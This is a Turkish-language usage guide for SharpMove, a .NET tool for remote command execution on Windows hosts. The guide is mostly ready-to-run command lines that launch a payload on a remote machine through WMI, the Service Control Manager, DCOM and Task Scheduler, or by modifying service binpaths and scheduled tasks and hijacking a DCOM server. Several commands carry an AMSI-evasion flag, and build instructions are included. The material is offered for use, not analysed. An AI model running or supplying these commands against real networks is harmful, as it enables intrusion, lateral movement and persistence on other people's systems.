# SharpMove Kullanım Rehberi

## Giriş
SharpMove, .NET tabanlı bir araçtır ve yetkili kimlik bilgileri ile uzaktaki Windows sistemlerde komut çalıştırma işlemleri gerçekleştirmek için tasarlanmıştır. Aşağıdaki rehber, SharpMove aracını kullanarak çeşitli işlemlerin nasıl yapılacağını ayrıntılı olarak açıklamaktadır.

---

## Gereksinimler
- .NET Framework yüklü bir sistem
- Visual Studio ile projeyi derlemek
- Hedef sistemde geçerli kimlik bilgileri (kullanıcı adı ve parola)

---

## Özellikler
SharpMove aşağıdaki işlemleri destekler:

- WMI (Windows Management Instrumentation)
- SCM (Service Control Manager)
- DCOM (Multiple Methods)
- Görev Zamanlayıcı (Task Scheduler)
- Hizmet DLL Hijack
- DCOM Sunucu Hijack
- Zamanlanmış Görev Modifikasyonu
- Hizmet binpath Modifikasyonu

---

## Komut Kullanımı
Aşağıda SharpMove komutlarının örnek kullanımları verilmiştir:

### 1. **WMI Query**
Hedef sistemde WMI sorgusu çalıştırma:
```
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
```

### 2. **Payload Oluşturma ve Çalıştırma**
Hedef sistemde belirli bir komutu veya dosyayı çalıştırma:
```
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
```

### 3. **VBS Çalıştırma**
Bir VBS dosyasını uzaktan çalıştırma:
```
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```

### 4. **Görev Zamanlayıcı Kullanımı**
Yeni bir görev zamanlayıcı oluşturma:
```
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```

### 5. **DCOM Kullanımı**
DCOM metodu ile komut çalıştırma:
```
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe" method=ShellBrowserWindow amsi=true
```

### 6. **SCM Kullanımı**
Yeni bir servis oluşturup çalıştırma:
```
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

### 7. **Servis Binpath Modifikasyonu**
Mevcut bir servisin binpath parametresini değiştirme:
```
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
```

### 8. **Zamanlanmış Görev Modifikasyonu**
Mevcut bir zamanlanmış görevi değiştirme:
```
SharpMove.exe action=modschtask computername=remote.host.local command="C:\windows\temp\payload.exe" username=domain\user password=password taskname=TestTask
```

### 9. **DCOM Hijack**
DCOM sunucusunu ele geçirerek çalıştırma:
```
SharpMove.exe action=hijackdcom computername=remote.host.local clsid={40bdc4e5-d532-42e6-b667-1ab890fdebcf}
```

### 10. **Servis Başlatma**
Belirtilen bir servisi başlatma:
```
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

---

## Derleme Talimatları
1. Visual Studio'yu açın.
2. SharpMove projesini yükleyin.
3. Çıkış türünü "Release" olarak ayarlayın.
4. Projeyi derleyin ve `SharpMove.exe` dosyasını kullanıma hazır hale getirin.

---

## Lisans
SharpMove, GPL-3.0 lisansı ile lisanslanmıştır.

---

## İletişim
Bu araç hakkında daha fazla bilgi almak için GitHub sayfasını ziyaret edebilirsiniz: [SharpMove GitHub](https://github.com/0xthirteen/SharpMove)
